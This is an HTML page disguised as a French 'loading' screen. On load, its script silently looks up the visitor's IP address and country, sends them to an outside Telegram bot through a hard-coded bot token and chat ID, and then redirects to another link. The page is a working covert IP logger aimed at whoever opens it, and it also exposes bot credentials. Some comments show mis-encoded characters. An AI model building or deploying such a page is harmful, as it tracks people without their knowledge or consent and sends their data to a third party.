<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Chargement...</title>
  <script>
    window.onload = async function () {
      try {
        // 1. RÃ©cupÃ©ration de l'IP et des infos pays
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        const ip = data.ip;
        const countryName = data.country_name;
        const countryCode = data.country_code; // ex: "FR"
        const flag = `https://flagsapi.com/${countryCode}/flat/64.png`; // API de drapeau

        // 2. Message formatÃ©
        const message = `ðŸ›°ï¸ Nouveau Visiteur\nðŸŒ Pays: ${countryName} (${countryCode})\nðŸ’» IP: ${ip}\nðŸ³ï¸ Drapeau: ${flag}`;

        // 3. Envoi Ã  Telegram
        const botToken = '7633904177:AAHGchn80h2QDuAmo_amRVwa7PxhgMNOPiY';
        const chatId = '6996434307';
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        await fetch(telegramUrl);

        // 4. Redirection aprÃ¨s 2 secondes
        setTimeout(() => {
          window.location.href = 'https://tonlien.com';
        }, 2000);

      } catch (error) {
        console.error("Erreur:", error);
      }
    };
  </script>
</head>
<body>
  <h2>Chargement en cours...</h2>
</body>
</html>
